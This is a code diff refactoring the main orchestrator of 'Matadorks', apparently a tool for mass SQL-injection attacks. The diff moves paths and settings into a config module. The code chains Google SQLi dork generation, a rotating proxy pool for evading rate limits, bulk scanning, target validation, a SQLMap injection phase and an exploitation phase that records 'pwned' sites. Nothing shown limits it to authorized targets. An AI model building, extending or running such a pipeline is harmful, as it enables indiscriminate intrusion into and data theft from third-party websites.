@@ -3,6 +3,7 @@ import sys
 from core.logger import Logger
 from core.state import State
 from core.git_handler import GitHandler
+from core import config
 from rich.panel import Panel
 from rich.console import Console
 
@@ -16,7 +17,11 @@ class MatadorksApp:
         self.state = State()
         self.logger = Logger()
         self.git = GitHandler()
-        self.version = "1.0.0"
+        try:
+            from importlib.metadata import version
+            self.version = version("matadorks")
+        except Exception:
+            self.version = "1.0.0"
 
     def sync_dependencies(self):
         self.logger.status("Synchronizing dependencies with uv...")
@@ -84,7 +89,7 @@ class MatadorksApp:
     def dorking_phase(self):
         from modules.dorker import generate_all
         dorks = generate_all()
-        output_path = "data/sqli_dorks.txt"
+        output_path = config.DORKS_FILE
         with open(output_path, "w") as f:
             for d in dorks: f.write(d + "\n")
         self.logger.info(f"Generated {len(dorks)} dorks in {output_path}")
@@ -93,31 +98,42 @@ class MatadorksApp:
         from core.proxy import get_google_pool
         pool = get_google_pool(auto_build=False)
         self.logger.info("Building proxy pool...")
-        pool.build(max_test=5000, workers=200)
+        pool.build(max_test=config.PROXY_MAX_TEST, workers=config.PROXY_WORKERS)
         self.logger.info(f"Proxy pool built with {pool.size()} working proxies.")
 
     def scanning_phase(self):
         from modules.scanner import main as scanner_main
         self.logger.info("Starting bulk scanning...")
-        scanner_main(threads=20, amount=50, prefix="matadorks")
+        scanner_main(
+            threads=config.SCANNER_THREADS,
+            amount=config.SCANNER_AMOUNT,
+            prefix=config.SCANNER_PREFIX
+        )
         self.logger.success("Scanning completed.")
 
     def validating_phase(self):
         from modules.validator import main as validator_main
         self.logger.info("Starting target validation...")
-        validator_main(input_file="data/matadorks_sqli_targets.txt", output_file="data/validated_targets.txt")
+        validator_main(
+            input_file=config.DORKS_FILE.replace("sqli_dorks", f"{config.SCANNER_PREFIX}_sqli_targets"),
+            output_file=config.VALIDATED_FILE
+        )
         self.logger.success("Validation completed.")
 
     def injecting_phase(self):
         from modules.injector import main as injector_main
         self.logger.info("Starting SQLMap injection phase...")
-        injector_main(input_file="data/validated_targets.txt", output_file="data/vulnerable_targets.txt")
+        injector_main(input_file=config.VALIDATED_FILE, output_file=config.VULNERABLE_FILE)
         self.logger.success("Injection phase completed.")
 
     def exploiting_phase(self):
         from modules.exploiter import main as exploiter_main
         self.logger.info("Starting exploitation phase...")
-        exploiter_main(input_file="data/vulnerable_targets.txt", summary_file="data/pwned_summary.txt", log_file="data/exploitation.log")
+        exploiter_main(
+            input_file=config.VULNERABLE_FILE,
+            summary_file=config.PWNED_SUMMARY_FILE,
+            log_file=config.EXPLOITATION_LOG_FILE
+        )
         self.logger.success("Exploitation phase completed.")
 
 if __name__ == "__main__":
